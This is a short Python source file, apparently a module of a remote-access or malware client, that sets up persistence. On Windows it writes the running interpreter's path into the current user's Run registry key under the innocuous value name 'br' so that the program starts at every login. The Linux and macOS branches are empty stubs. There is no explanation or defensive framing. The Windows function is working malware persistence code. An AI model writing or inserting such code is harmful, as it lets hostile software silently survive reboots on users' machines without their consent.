# -*- coding: utf-8 -*-

import sys


def windows_persistance():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU

    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = sys.executable

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
        _winreg.CloseKey(reg_key)
        return True, 'HKCU Run key applied.'
    except WindowsError:
        return False, 'HKCU Run key failed.'


def linux_persistance():
    return False, 'Nothing here yet.'


def mac_persistance():
    return False, 'Nothing here yet.'


def run():
    if sys.platform.startswith('win'):
        success, details = windows_persistance()
    elif sys.platform.startswith('linux'):
        success, details = linux_persistance()
    elif sys.platform.startswith('darwin'):
        success, details = mac_persistance()
    else:
        success, details = False, 'Platform unsupported.'

    return success, details
